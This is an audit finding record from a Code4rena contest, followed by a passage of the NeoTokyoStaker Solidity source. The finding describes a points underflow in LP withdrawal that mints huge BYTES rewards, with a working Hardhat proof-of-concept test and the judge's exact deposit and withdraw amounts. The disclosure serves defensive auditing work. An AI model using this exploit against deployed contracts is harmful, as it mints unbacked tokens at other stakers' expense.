{
  "Title": "[H-02] Underflow of `lpPosition.points` during withdrawLP causes huge reward minting",
  "Content": "\nNeoTokyoStaking allows to stake and withdraw LPs. User can stake multiple times on same position which simply results in extended lock time and user can withdraw all of these LPs once lock time is passed.\n\nThere is a scenario when withdrawing LPs results in overflow of [lpPosition.points](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1627). After withdraw if attacker calls `getRewards()` then attacker will get more than 1e64 BYTES tokens as reward.\n\n### Proof of Concept\n\nAffected code block: [NeoTokyoStaker.sol#L1622-L1631](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1622-L1631)\n\nAffected line: [L1627](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1627)\n\nFrom below POC, you can see that Alice is staking twice and some specific amounts which will trigger underflow when Alice withdraw LP. Once staked LPs are unlocked, Alice can withdraw her LPs and call `getReward()` to trigger minting of more than 1e64 BYTES tokens.\n\nBelow test can be added in `NeoTokyoStaker.test.js` test file.\n\n```js\n\t\tit('Unexpected rewards minting due to underflow of \"points\"', async function () {\n\t\t\t// Configure the LP token contract address on the staker.\n\t\t\tawait NTStaking.connect(owner.signer).configureLP(LPToken.address);\n\t\t\tconst amount1 = ethers.utils.parseEther('10.009')\n\t\t\tconst amount2 = ethers.utils.parseEther('11.009')\n\t\t\tconst lockingDays = 30\n\t\t\t\n\t\t\t// Alice stake amount1 LPs for 30 days.\n\t\t\tawait NTStaking.connect(alice.signer).stake(\n\t\t\t\tASSETS.LP.id,\n\t\t\t\tTIMELOCK_OPTION_IDS[lockingDays],\n\t\t\t\tamount1,\n\t\t\t\t0,\n\t\t\t\t0\n\t\t\t);\n\n\t\t\t// Alice stake amount2 LPs for 30 days.\n\t\t\tawait NTStaking.connect(alice.signer).stake(\n\t\t\t\tASSETS.LP.id,\n\t\t\t\tTIMELOCK_OPTION_IDS[lockingDays],\n\t\t\t\tamount2,\n\t\t\t\t0,\n\t\t\t\t0\n\t\t\t);\n\n\t\t\tconst priorBlockNumber = await ethers.provider.getBlockNumber();\n\t\t\tconst priorBlock = await ethers.provider.getBlock(priorBlockNumber);\n\t\t\tlet aliceStakeTime = priorBlock.timestamp;\n\t\t\t\n\t\t\t// Bob stake 10 LPs for 30 days\n\t\t\tawait NTStaking.connect(bob.signer).stake(\n\t\t\t\tASSETS.LP.id,\n\t\t\t\tTIMELOCK_OPTION_IDS[lockingDays],\n\t\t\t\tethers.utils.parseEther('10'),\n\t\t\t\t0,\n\t\t\t\t0\n\t\t\t);\n\n\t\t\t// Set time to unlock staked lp\n\t\t\tawait ethers.provider.send('evm_setNextBlockTimestamp', [\n\t\t\t\taliceStakeTime + (60 * 60 * 24 * lockingDays)\n\t\t\t]);\n\t\t\t\n\t\t\t// Alice withdraw LP\n                        // This transaction will cause underflow of `lpPosition.points`\n\t\t\tawait NTStaking.connect(alice.signer).withdraw(\n\t\t\t\tASSETS.LP.id,\n\t\t\t\tamount1.add(amount2)\n\t\t\t);\n\n\t\t\t// Before exploit:: Verify Alice's Bytes balance is less than 10000 BYTES\n\t\t\texpect(await NTBytes2_0.balanceOf(alice.address)).lt(ethers.utils.parseUnits('10000', 18))\n\t\t\t\n\t\t\t// Get rewards for Alice. It will mint HUGE rewards due to underflow happened on withdraw transaction.\n\t\t\tawait NTBytes2_0.getReward(alice.address)\n\n\t\t\t// After exploit:: Verify Alice's Bytes balance is greater than 3e64\n\t\t\texpect(await NTBytes2_0.balanceOf(alice.address)).gt(ethers.utils.parseUnits('3', 64))\n\t\t});\n```\n\n### Recommended Mitigation Steps\n\nConsider adding proper precision for `points` and `totalPoints` and also consider checking for under/overflows.\n\n**[TimTinkers (Neo Tokyo) commented](https://github.com/code-423n4/2023-03-neotokyo-findings/issues/261#issuecomment-1477324787):**\n > @hansfriese - this attack is a different way of abusing the same rounding bug from [#348](https://github.com/code-423n4/2023-03-neotokyo-findings/issues/348); duplicates?\n> \n> I agree with the severity of the underlying issue and really appreciate the test case demonstrating this.\n\n**[hansfriese (judge) commented](https://github.com/code-423n4/2023-03-neotokyo-findings/issues/261#issuecomment-1477516448):**\n > Totally, there are 3 kinds of rounding issues.\n> 1. Users can get infinite points by depositing `5e15` twice and withdrawing `1e16`. So `0 * 2 - 1 = -1 = type(uint256).max`\n> 2. Users can get free points by depositing 1e16 and withdrawing 5e15 twice. So `1 - 0 * 2 = 1`\n> 3. Users would lose some LP(or staking reward) due to the rounding.\n> \n> After discussing with other judges, I will merge 1 and 2 into one high and mark 3 as QA as it contains a lower impact.\n\n**[TimTinkers (Neo Tokyo) confirmed](https://github.com/code-423n4/2023-03-neotokyo-findings/issues/261#issuecomment-1482544958)**\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2023-03-neo-tokyo-contest",
  "Code": [
    {
      "filename": "contracts/staking/NeoTokyoStaker.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity ^0.8.19;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nimport \"../access/PermitControl.sol\";\nimport \"../interfaces/IByteContract.sol\";\nimport \"../interfaces/IGenericGetter.sol\";\n\n/**\n\tThrown during when attempting to operate on a non-existent Citizen (S1 or S2).\n\n\t@param citizenId The ID of the caller's specified Citizen.\n*/\nerror CitizenDoesNotExist (\n\tuint256 citizenId\n);\n\n/**\n\tThrown when attempting to get a staker's position of an unknowable asset type.\n\n\t@param assetType The caller's specified asset type.\n*/\nerror UnknowablePosition (\n\tuint256 assetType\n);\n\n/**\n\tThrown when an S1 Citizen with a component Vault attempts to stake while \n\tattaching an optional non-component Vault.\n\n\t@param componentVaultId The ID of the S1 Citizen's component Vault.\n\t@param noncomponentVaultId The ID of the Vault the caller attempted to stake.\n*/\nerror CitizenAlreadyHasVault (\n\tuint256 componentVaultId,\n\tuint256 noncomponentVaultId\n);\n\n/**\n\tThrown when an S1 Citizen attempts to wrongfully claim the Hand bonus.\n\n\t@param citizenId The ID of the caller's specified S1 Citizen.\n*/\nerror CitizenIsNotHand (\n\tuint256 citizenId\n);\n\n/**\n\tThrown when a BYTES stake would exceed the cap of its corresponding Citizen.\n\n\t@param attemptedAmount The amount that the user is attempting to stake to.\n\t@param cap The staking cap of the Citizen.\n*/\nerror AmountExceedsCap (\n\tuint256 attemptedAmount,\n\tuint256 cap\n);\n\n/**\n\tThrown when attempting to stake BYTES into an unowned Citizen.\n\n\t@param citizenId The token ID of the Citizen involved in the attempted stake.\n\t@param seasonId The season ID of the Citizen, whether S1 or S2.\n*/\nerror CannotStakeIntoUnownedCitizen (\n\tuint256 citizenId,\n\tuint256 seasonId\n);\n\n/**\n\tThrown when attempting to stake BYTES into an invalid Citizen season.\n\n\t@param seasonId The ID of the Citizen season to try staking BYTES into.\n*/\nerror InvalidSeasonId (\n\tuint256 seasonId\n);\n\n/**\n\tThrown when attempting to increase a stake in an asset without matching the \n\texisting timelock of the asset.\n*/\nerror MismatchedTimelock ();\n\n/**\n\tThrown during staking or unstaking if an invalid AssetType is specified.\n\n\t@param assetType The caller's specified asset type.\n*/\nerror InvalidAssetType (\n\tuint256 assetType\n);\n\n/**\n\tThrown during staking if attempting to stake into an unconfigured asset pool.\n\n\t@param assetType The caller's specified asset type.\n*/\nerror UnconfiguredPool (\n\tuint256 assetType\n);\n\n/**\n\tThrown during staking if attempting to stake into an asset pool whose rewards \n\tare not yet active.\n\n\t@param assetType The caller's specified asset type.\n*/\nerror InactivePool (\n\tuint256 assetType\n);\n\n/**\n\tThrown during staking if an invalid timelock option is specified. Each \n\tAssetType being staked may have independently-configured timelock options.\n\n\t@param assetType The caller's specified asset type.\n\t@param timelockId The caller's specified timelock ID against `assetType`.\n*/\nerror InvalidTimelockOption (\n\tuint256 assetType,\n\tuint256 timelockId\n);\n\n/// Thrown if the caller of a function is not the BYTES contract.\nerror CallerIsNotBYTES ();\n\n/**\n\tThrown when withdrawing an asset fails to clear a timelock.\n\t\n\t@param endTime The time that the staked asset timelock ends.\n*/\nerror TimelockNotCleared (\n\tuint256 endTime\n);\n\n/**\n\tThrown when attempting to withdraw an unowned S1 Citizen.\n\n\t@param citizenId The ID of the S1 Citizen attempted to be withdrawn.\n*/\nerror CannotWithdrawUnownedS1 (\n\tuint256 citizenId\n);\n\n/**\n\tThrown when attempting to withdraw an unowned S2 Citizen.\n\n\t@param citizenId The ID of the S2 Citizen attempted to be withdrawn.\n*/\nerror CannotWithdrawUnownedS2 (\n\tuint256 citizenId\n);\n\n/**\n\tThrown if a caller tries to withdraw more LP tokens than they had staked.\n\n\t@param attemptedWithdraw The amount of LP tokens that the caller attempted to \n\t\twithdraw.\n\t@param position The amount of LP tokens that the caller has actually staked.\n*/\nerror NotEnoughLPTokens (\n\tuint256 attemptedWithdraw,\n\tuint256 position\n);\n\n/// Thrown if attempting to configure the LP token address post-lock.\nerror LockedConfigurationOfLP ();\n\n/// Thrown when specifying invalid reward windows for a pool.\nerror RewardWindowTimesMustIncrease ();\n\n/**\n\t@custom:benediction DEVS BENEDICAT ET PROTEGAT CONTRACTVS MEAM\n\t@title A pool-based staking contract for the Neo Tokyo ecosystem.\n\t@author Tim Clancy <@_Enoch>\n\t@author Rostislav Khlebnikov <@catpic5buck>\n\n\tThis contract allows callers to stake their Neo Tokyo Citizens (both S1 and \n\tS2) and BYTES for\ttime-locked emission rewards. The staker operates on a \n\tpoint-based, competitive system where stakers compete for a finite amount of \n\tdaily emissions. It allows permissioned managers to configure various \n\temission details for the Neo Tokyo ecosystem.\n\n\t@custom:date February 14th, 2023.\n*/\ncontract NeoTokyoStaker is PermitControl, ReentrancyGuard {\n\n\t/// The `transferFrom` selector for ERC-20 and ERC-721 tokens.\n\tbytes4 constant private _TRANSFER_FROM_SELECTOR = 0x23b872dd;\n\n\t/// The `transfer` selector for ERC-20 tokens.\n\tbytes4 constant private _TRANSFER_SELECTOR = 0xa9059cbb;\n\n\t/// A constant multiplier to reduce overflow in staking calculations.\n\tuint256 constant private _PRECISION = 1e12;\n\n\t/// A constant divisor to calculate points and multipliers as basis points.\n\tuint256 constant private _DIVISOR = 100;\n\n\t/// The number of BYTES needed to get one point in BYTES staking calculations.\n\tuint256 constant private _BYTES_PER_POINT = 200 * 1e18;\n\n\t/// The identifier for the right to configure the LP token address.\n\tbytes32 public constant CONFIGURE_LP = keccak256(\"CONFIGURE_LP\");\n\n\t/// The identifier for the right to configure timelock options.\n\tbytes32 public constant CONFIGURE_TIMELOCKS = keccak256(\n\t\t\"CONFIGURE_TIMELOCKS\"\n\t);\n\n\t/// The identifier for the right to configure Identity and Vault points.\n\tbytes32 public constant CONFIGURE_CREDITS = keccak256(\"CONFIGURE_CREDITS\");\n\n\t/// The identifier for the right to configure emission rates and the DAO tax.\n\tbytes32 public constant CONFIGURE_POOLS = keccak256(\"CONFIGURE_POOLS\");\n\n\t/// The identifier for the right to configure BYTES staking caps.\n\tbytes32 public constant CONFIGURE_CAPS = keccak256(\"CONFIGURE_CAPS\");\n\n\t/// The address of the new BYTES 2.0 token contract.\n\taddress immutable public BYTES;\n\n\t/// The address of the assembled Neo Tokyo S1 Citizen contract.\n\taddress immutable public S1_CITIZEN;\n\n\t/// The address of the assembled Neo Tokyo S2 Citizen contract.\n\taddress immutable public S2_CITIZEN;\n\n\t/// The address of the LP token contract.\n\taddress public LP;\n\n\t/**\n\t\tThe address of the Neo Tokyo S1 Identity contract. This specific contract \n\t\taddress is stored to check an assembled S1 Citizen's specific component \n\t\tidentity in order to check for Hands of the Citadel.\n\t*/\n\taddress immutable public IDENTITY;\n\n\t/// The address of the Neo Tokyo S1 Vault contract.\n\taddress immutable public VAULT;\n\n\t/**\n\t\tThe limit on the number of BYTES that may be staked per S1 Citizen \n\t\tassembled with a component Vault or per Vault-less S1 Citizen staked \n\t\talongside a Vault.\n\t*/\n\tuint256 public VAULT_CAP;\n\n\t/**\n\t\tThe limit on the number of BYTES that may be staked per S2 Citizen or S1 \n\t\tCitizen without Vault.\n\t*/\n\tuint256 public NO_VAULT_CAP;\n\n\t/**\n\t\tThis enum tracks each type of asset that may be operated on with this \n\t\tstaker.\n\n\t\t@param S1_CITIZEN A staked Neo Tokyo S1 Citizen.\n\t\t@param S2_CITIZEN A staked Neo Tokyo S2 Citizen.\n\t\t@param BYTES A set of staked BYTES ERC-20 token.\n\t\t@param LP Staked BYTES-ETH LP ERC-20 token.\n\t*/\n\tenum AssetType {\n\t\tS1_CITIZEN,\n\t\tS2_CITIZEN,\n\t\tBYTES,\n\t\tLP\n\t}\n\n\t/**\n\t\tThis mapping contains the per-asset configuration of different timelock \n\t\tperiods with their associated multipliers. For each asset, the interior \n\t\tmapping correlates a particular timelock option to a uint256 which encodes \n\t\tthe duration of the timelock in its upper 128 bits and the multiplier \n\t\toffered by that timelock, as basis points, in its lower 128 bits.\n\t*/\n\tmapping ( AssetType => mapping ( uint256 => uint256 )) public\ttimelockOptions;\n\n\t/**\n\t\tThis struct defines a specific time window in reward emission history. For \n\t\ta particular asset staking pool, it represents that beginning from \n\t\t`startTime`, the pool had a per-second reward emission rate of `reward`.\n\n\t\t@param startTime The time at which the daily reward activated.\n\t\t@param reward The reward emission rate beginning at `startTime`.\n\t*/\n\tstruct RewardWindow {\n\t\tuint128 startTime;\n\t\tuint128 reward;\n\t}\n\n\t/**\n\t\tThis struct is used to define both the configuration details for a \n\t\tparticular asset staking pool and the state of that pool as callers begin \n\t\tinteracting with it.\n\n\t\t@param totalPoints The total number of points in the pool.\n\t\t@param daoTax The percent, in basis points, of the reward emissions sent to \n\t\t\tthe DAO.\n\t\t@param rewardCount A count of the number of reward windows in the \n\t\t\t`rewardWindows` mapping, used for iterating.\n\t\t@param rewardWindows A mapping of the historic amount of BYTES token \t\n\t\t\trewarded per-second across all stakers in this particular pool.\n\t*/\n\tstruct PoolData {\n\t\tuint256 totalPoints;\n\t\tuint256 daoTax;\n\t\tuint256 rewardCount;\n\t\tmapping ( uint256 => RewardWindow ) rewardWindows;\n\t}\n\n\t/// Map an asset type to its corresponding pool data. \n\tmapping ( AssetType => PoolData ) private _pools;\n\t\n\t/// Track the last time a caller was granted their rewards for each asset.\n\tmapping ( address => mapping ( AssetType => uint256 )) public lastRewardTime;\n\n\t/** \n\t\tThis admin-configurable double-mapping allows us to deduce the Identity \n\t\t\"Credit Yield\" string of a Neo Tokyo S1 Citizen given the Citizen's reward \n\t\trate and the reward rate of the Citizen's Vault.\n\t*/\n\tmapping ( uint256 => mapping ( string => string )) public identityCreditYield;\n\n\t/// Assign a configurable multiplier to each S1 Citizen's Identity credit. \n\tmapping ( string => uint256 ) public identityCreditPoints;\n\n\t/// Assign a configurable multiplier to each S1 Citizen's Vault credit. \n\tmapping ( string => uint256 ) public vaultCreditMultiplier;\n\n\t/**\n\t\tThis struct records the state of each staked S1 Citizen.\n\n\t\t@param stakedBytes The number of BYTES that have been staked into this S1 \n\t\t\tCitizen. Depending on the value of `hasVault`, this S1 Citizen  will be \n\t\t\tbound to either the `VAULT_CAP` limit or `NO_VAULT_CAP` limit on the \n\t\t\tnumber of BYTES that may be staked.\n\t\t@param timelockEndTime The time at which the forced, timelocked staking of \n\t\t\tthis S1 Citizen ends. After this time the S1 Citizen may be withdrawn \n\t\t\tfrom the staker.\n\t\t@param points The number of base points that this staked S1 Citizen is \n\t\t\tworth, thus determining its share of emissions. An S1 Citizen's base \n\t\t\tpoints are a function of the S1 Citizen's component Identity and any \n\t\t\tassociated Vault multiplier. The base points are also multiplied by the \n\t\t\ttimelock option chosen at the time of staking. The base points are \n\t\t\tsupplemented in points calculations by the value of `stakedBytes`.\n\t\t@param stakedVaultId The optional ID of the Vault, if there is one, that \n\t\t\thas been staked alongside this S1 Citizen. If `hasVault` is true, this \n\t\t\tvalue may be non-zero to indicate a staked but non-component Vault. If \n\t\t\t`hasVault` is true and this value is zero, that is indicative of an S1 \n\t\t\tCitizen with a component Vault.\n\t\t@param hasVault A boolean indicating whether or not this S1 Citizen has an \n\t\t\tassociated Vault, whether that Vault is a component Vault assembled into \n\t\t\tthe S1 Citizen or one that has been staked alongside the S1 Citizen.\n\t*/\n\tstruct StakedS1Citizen {\n\t\tuint256 stakedBytes;\n\t\tuint256 timelockEndTime;\n\t\tuint256 points;\n\t\tuint256 stakedVaultId;\n\t\tbool hasVault;\n\t}\n\n\t/**\n\t\tA double mapping from a caller address to a specific S1 Citizen token ID to \n\t\tthe staking status of each S1 Citizen. This records the unique per-user \n\t\tstaking status of each S1 citizen.\n\t*/\n\tmapping ( address => mapping( uint256 => StakedS1Citizen )) public stakedS1;\n\n\t/**\n\t\tThis mapping correlates a caller address to a list of their \n\t\tcurrently-staked S1 Citizen token IDs.\n\t*/\n\tmapping ( address => uint256[] ) private _stakerS1Position;\n\n\t/**\n\t\tThis struct records the state of each staked S2 Citizen.\n\n\t\t@param stakedBytes The number of BYTES that have been staked into this S2 \n\t\t\tCitizen.\n\t\t@param timelockEndTime The time at which the forced, timelocked staking of \n\t\t\tthis S2 Citizen ends. After this time the S2 Citizen may be withdrawn \n\t\t\tfrom the staker.\n\t\t@param points The number of base points that this staked S2 Citizen is \n\t\t\tworth, thus determining its share of emissions. An S2 Citizen's base \n\t\t\tpoints are a function of the timelock option chosen at the time of \n\t\t\tstaking. The base points are supplemented in points calculations by the \n\t\t\tvalue of `stakedBytes`.\n\t*/\n\tstruct StakedS2Citizen {\n\t\tuint256 stakedBytes;\n\t\tuint256 timelockEndTime;\n\t\tuint256 points;\n\t}\n\n\t/**\n\t\tA double mapping from a caller address to a specific S2 Citizen token ID to \n\t\tthe staking status of each S2 Citizen. This records the unique per-user \n\t\tstaking status of each S2 citizen.\n\t*/\n\tmapping ( address => mapping( uint256 => StakedS2Citizen )) public stakedS2;\n\n\t/**\n\t\tThis mapping correlates a caller address to a list of their \n\t\tcurrently-staked S2 Citizen token IDs.\n\t*/\n\tmapping ( address => uint256[] ) private _stakerS2Position;\n\n\t/**\n\t\tThis struct defines the LP token staking position of a particular staker.\n\n\t\t@param amount The amount of LP tokens staked by the staker.\n\t\t@param timelockEndTime The tiume at which the forced, timelocked staking of \n\t\t\tthese LP tokens ends. After this the LP tokens may be withdrawn.\n\t\t@param points The number of points that this LP position accrues.\n\t\t@param multiplier The multiplier portion of the timelock option recorded so \n\t\t\tas to enforce later stakes to use the same point rate.\n\t*/\n\tstruct LPPosition {\n\t\tuint256 amount;\n\t\tuint256 timelockEndTime;\n\t\tuint256 points;\n\t\tuint256 multiplier;\n\t}\n\n\t/**\n\t\tThis mapping correlates each caller address to details regarding the LP \n\t\ttoken stake of that caller.\n\t*/\n\tmapping ( address => LPPosition ) public stakerLPPosition;\n\n\t/**\n\t\tThis struct supplies the position output state of each staked S1 Citizen.\n\n\t\t@param citizenId The token ID of this S1 Citizen.\n\t\t@param stakedBytes The number of BYTES that have been staked into this S1 \n\t\t\tCitizen. Depending on the value of `hasVault`, this S1 Citizen  will be \n\t\t\tbound to either the `VAULT_CAP` limit or `NO_VAULT_CAP` limit on the \n\t\t\tnumber of BYTES that may be staked.\n\t\t@param timelockEndTime The time at which the forced, timelocked staking of \n\t\t\tthis S1 Citizen ends. After this time the S1 Citizen may be withdrawn \n\t\t\tfrom the staker.\n\t\t@param points The number of base points that this staked S1 Citizen is \n\t\t\tworth, thus determining its share of emissions. An S1 Citizen's base \n\t\t\tpoints are a function of the S1 Citizen's component Identity and any \n\t\t\tassociated Vault multiplier. The base points are also multiplied by the \n\t\t\ttimelock option chosen at the time of staking. The base points are \n\t\t\tsupplemented in points calculations by the value of `stakedBytes`.\n\t\t@param stakedVaultId The optional ID of the Vault, if there is one, that \n\t\t\thas been staked alongside this S1 Citizen. If `hasVault` is true, this \n\t\t\tvalue may be non-zero to indicate a staked but non-component Vault. If \n\t\t\t`hasVault` is true and this value is zero, that is indicative of an S1 \n\t\t\tCitizen with a component Vault.\n\t\t@param hasVault A boolean indicating whether or not this S1 Citizen has an \n\t\t\tassociated Vault, whether that Vault is a component Vault assembled into \n\t\t\tthe S1 Citizen or one that has been staked alongside the S1 Citizen.\n\t*/\n\tstruct StakedS1CitizenOutput {\n\t\tuint256 citizenId;\n\t\tuint256 stakedBytes;\n\t\tuint256 timelockEndTime;\n\t\tuint256 points;\n\t\tuint256 stakedVaultId;\n\t\tbool hasVault;\n\t}\n\n\t/**\n\t\tThis struct supplies the position output state of each staked S2 Citizen.\n\n\t\t@param citizenId The token ID of this S1 Citizen.\n\t\t@param stakedBytes The number of BYTES that have been staked into this S2 \n\t\t\tCitizen.\n\t\t@param timelockEndTime The time at which the forced, timelocked staking of \n\t\t\tthis S2 Citizen ends. After this time the S2 Citizen may be withdrawn \n\t\t\tfrom the staker.\n\t\t@param points The number of base points that this staked S2 Citizen is \n\t\t\tworth, thus determining its share of emissions. An S2 Citizen's base \n\t\t\tpoints are a function of the timelock option chosen at the time of \n\t\t\tstaking. The base points are supplemented in points calculations by the \n\t\t\tvalue of `stakedBytes`.\n\t*/\n\tstruct StakedS2CitizenOutput {\n\t\tuint256 citizenId;\n\t\tuint256 stakedBytes;\n\t\tuint256 timelockEndTime;\n\t\tuint256 points;\n\t}\n\n\t/**\n\t\tThis struct records the state of all assets staked by a particular staker \n\t\taddress in this staker.\n\n\t\t@param stakedS1Citizens An array containing information about each S1 \n\t\t\tCitizen staked by a particular staker address.\n\t\t@param stakedS2Citizens An array containing information about each S2 \n\t\t\tCitizen staked by a particular staker address.\n\t\t@param stakedLPPosition Details regarding the LP token stake of a particular\n\t\t\tstaker address.\n\t*/\n\tstruct StakerPosition {\n\t\tStakedS1CitizenOutput[] stakedS1Citizens;\n\t\tStakedS2CitizenOutput[] stakedS2Citizens;\n\t\tLPPosition stakedLPPosition;\n\t}\n\n\t/// Whether or not setting the LP token contract address is locked.\n\tbool public lpLocked;\n\n\t/**\n\t\tThis struct records an input to the staker's `configurePools` function.\n\n\t\t@param assetType The asset type for the corresponding pool to set.\n\t\t@param daoTax The percent, in basis points, of the reward emissions sent to \n\t\t\tthe DAO.\n\t\t@param rewardWindows An array specifying the historic amount of BYTES token\n\t\t\trewarded per-second across all stakers in this particular pool.\n\t*/\n\tstruct PoolConfigurationInput {\n\t\tAssetType assetType;\n\t\tuint256 daoTax;\n\t\tRewardWindow[] rewardWindows;\n\t}\n\n\t/**\n\t\tThis event is emitted when an asset is successfully staked.\n\n\t\t@param staker The address of the caller who staked an `asset`.\n\t\t@param asset The address of the asset being staked.\n\t\t@param timelockOption Data encoding the parameters surrounding the timelock \n\t\t\toption used in staking the particular asset. Alternatively, this encodes \n\t\t\tctiizen information for BYTES staking.\n\t\t@param amountOrTokenId The amount of `asset` staked or, for S1 and S2 \n\t\t\tCitizens, the ID of the specific token staked.\n\t*/\n\tevent Stake (\n\t\taddress indexed staker,\n\t\taddress indexed asset,\n\t\tuint256 timelockOption,\n\t\tuint256 amountOrTokenId\n\t);\n\n\t/**\n\t\tThis event is emitted each time a recipient claims a reward.\n\n\t\t@param recipient The recipient of the reward.\n\t\t@param reward The amount of BYTES rewarded to the `recipient`.\n\t\t@param tax The amount of BYTES minted as tax to the DAO.\n\t*/\n\tevent Claim (\n\t\taddress indexed recipient,\n\t\tuint256 reward,\n\t\tuint256 tax\n\t);\n\n\t/**\n\t\tThis event is emitted when an asset is successfully withdrawn.\n\n\t\t@param caller The address of the caller who withdrew an `asset`.\n\t\t@param asset The address of the asset being withdrawn.\n\t\t@param amountOrTokenId The amount of `asset` withdrawn or, for S1 and S2 \n\t\t\tCitizens, the ID of the specific token withdrawn.\n\t*/\n\tevent Withdraw (\n\t\taddress indexed caller,\n\t\taddress indexed asset,\n\t\tuint256 amountOrTokenId\n\t);\n\n\t/**\n\t\tConstruct a new instance of this Neo Tokyo staker configured with the given \n\t\timmutable contract addresses.\n\n\t\t@param _bytes The address of the BYTES 2.0 ERC-20 token contract.\n\t\t@param _s1Citizen The address of the assembled Neo Tokyo S1 Citizen.\n\t\t@param _s2Citizen The address of the assembled Neo Tokyo S2 Citizen.\n\t\t@param _lpToken The address of the LP token.\n\t\t@param _identity The address of the specific Neo Tokyo Identity sub-item.\n\t\t@param _vault The address of the specific Neo Tokyo Vault sub-item.\n\t\t@param _vaultCap The limit on the number of BYTES that may be staked per S1 \n\t\t\tCitizen assembled with a component Vault or staked alongside a Vault.\n\t\t@param _noVaultCap The limit on the number of BYTES that may be staked per \n\t\t\tS2 Citizen or S1 Citizen without Vault.\n\t*/\n\tconstructor (\n\t\taddress _bytes,\n\t\taddress _s1Citizen,\n\t\taddress _s2Citizen,\n\t\taddress _lpToken,\n\t\taddress _identity,\n\t\taddress _vault,\n\t\tuint256 _vaultCap,\n\t\tuint256 _noVaultCap\n\t) {\n\t\tBYTES = _bytes;\n\t\tS1_CITIZEN = _s1Citizen;\n\t\tS2_CITIZEN = _s2Citizen;\n\t\tLP = _lpToken;\n\t\tIDENTITY = _identity;\n\t\tVAULT = _vault;\n\t\tVAULT_CAP = _vaultCap;\n\t\tNO_VAULT_CAP = _noVaultCap;\n\t}\n\n\t/**\n\t\tNeo Tokyo Identity items do not expose their \"Credit Yield\" trait values in \n\t\tan easily-consumed fashion. This function works backwards to calculate the \n\t\tunderlying \"Credit Yield\" trait value of the component Identity item of the \n\t\tNeo Tokyo S1 Citizen with the token ID of `_citizenId` given the reward \n\t\trate of the S1 Citizen as a whole and the credit multiplier of any \n\t\tcomponent Vault.\n\n\t\t@param _citizenId The token ID of the Neo Tokyo S1 Citizen to retrieve an \n\t\t\tIdentity \"Credit Yield\" trait value for.\n\t\t@param _vaultId The token ID of the Neo Tokyo S1 Citizen's component Vault, \n\t\t\tif there is one. This parameter is separated to optimized for callers who \n\t\t\thave already predetermined the token ID of the Vault.\n\n\t\t@return The \"Credit Yield\" trait value of the component Identity item of \n\t\t\tthe S1 Citizen with the token ID of `_citizenId`.\n\t*/\n\tfunction getCreditYield (\n\t\tuint256 _citizenId,\n\t\tuint256 _vaultId\n\t) public view returns (string memory) {\n\n\t\t// Retrieve the total reward rate of this S1 Citizen.\n\t\tIGenericGetter citizen = IGenericGetter(S1_CITIZEN);\n\t\tuint256 rewardRate = citizen.getRewardRateOfTokenId(_citizenId);\n\t\tif (rewardRate == 0) {\n\t\t\trevert CitizenDoesNotExist(_citizenId);\n\t\t}\n\n\t\t// Retrieve the credit rate multiplier of any associated Vault.\n\t\tIGenericGetter vault = IGenericGetter(VAULT);\n\t\tstring memory vaultMultiplier = (_vaultId != 0)\n\t\t\t? vault.getCreditMultiplier(_vaultId)\n\t\t\t: \"\";\n\t\t\n\t\t// Deduce the original Identity credit yield.\n\t\treturn identityCreditYield[rewardRate][vaultMultiplier];\n\t}\n\n\t/**\n\t\tThe multipliers to S1 Citizen points contributed by their component Vaults \n\t\tmay be independently configured by permitted administrators of this staking \n\t\tcontract. This helper function returns any of the multipliers that may have \n\t\tbeen configured.\n\n\t\t@param _vaultId The token ID of a Neo Tokyo S1 Vault to retrieve the \n\t\t\tconfigued multiplier for.\n\n\t\t@return The configured point multiplier for the Vault with token ID of \n\t\t\t`_vaultId`.\n\t*/\n\tfunction getConfiguredVaultMultiplier (\n\t\tuint256 _vaultId\n\t) public view returns (uint256) {\n\n\t\t// Retrieve the credit rate multiplier of the Vault.\n\t\tIGenericGetter vault = IGenericGetter(VAULT);\n\t\tstring memory vaultMultiplier = (_vaultId != 0)\n\t\t\t? vault.getCreditMultiplier(_vaultId)\n\t\t\t: \"\";\n\t\t\n\t\t// Deduce the configured Vault multiplier.\n\t\treturn vaultCreditMultiplier[vaultMultiplier];\n\t}\n\n\t/**\n\t\tReturn the list of `_staker`'s token IDs for the specified `_assetType` if \n\t\tthat type is the Neo Tokyo S1 Citizen or S2 Citizen. In order to determine \n\t\tthe staker's position in the LP asset type, the public `stakerLPPosition` \n\t\tmapping should be used. It is not valid to directly determine the position \n\t\tin BYTES of a particular staker; to retrieve that kind of cumulative data \n\t\tthe full output `getStakerPositions` function should be used.\n\n\t\t@param _staker The address of the staker to check for staked Citizen \n\t\t\tholdings.\n\t\t@param _assetType The asset type to check for staked holdings. This must be \n\t\t\tthe S1 Citizen or S2 Citizen type.\n\n\t\t@return The list of token IDs of a particular Citizen type that have been \n\t\t\tstaked by `_staker`.\n\t*/\n\tfunction getStakerPosition (\n\t\taddress _staker,\n\t\tAssetType _assetType\n\t) external view returns (uint256[] memory) {\n\t\tif (_assetType == AssetType.S1_CITIZEN) {\n\t\t\treturn _stakerS1Position[_staker];\n\t\t} else if (_assetType == AssetType.S2_CITIZEN) {\n\t\t\treturn _stakerS2Position[_staker];\n\t\t} else {\n\t\t\trevert UnknowablePosition(uint256(_assetType));\n\t\t}\n\t}\n\n\t/**\n\t\tRetrieve the entire position of the specified `_staker` across all asset \n\t\ttypes in this staker.\n\n\t\t@param _staker The address of the staker to check for assets.\n\n\t\t@return The position of the `_staker` across all asset types.\n\t*/\n\tfunction getStakerPositions (\n\t\taddress _staker\n\t) external view returns (StakerPosition memory) {\n\n\t\t// Compile the S1 Citizen details.\n\t\tStakedS1CitizenOutput[] memory stakedS1Details =\n\t\t\tnew StakedS1CitizenOutput[](_stakerS1Position[_staker].length);\n\t\tfor (uint256 i; i < _stakerS1Position[_staker].length; ) {\n\t\t\tuint256 citizenId = _stakerS1Position[_staker][i];\n\t\t\tStakedS1Citizen memory citizenDetails = stakedS1[_staker][citizenId];\n\t\t\tstakedS1Details[i] = StakedS1CitizenOutput({\n\t\t\t\tcitizenId: citizenId,\n\t\t\t\tstakedBytes: citizenDetails.stakedBytes,\n\t\t\t\ttimelockEndTime: 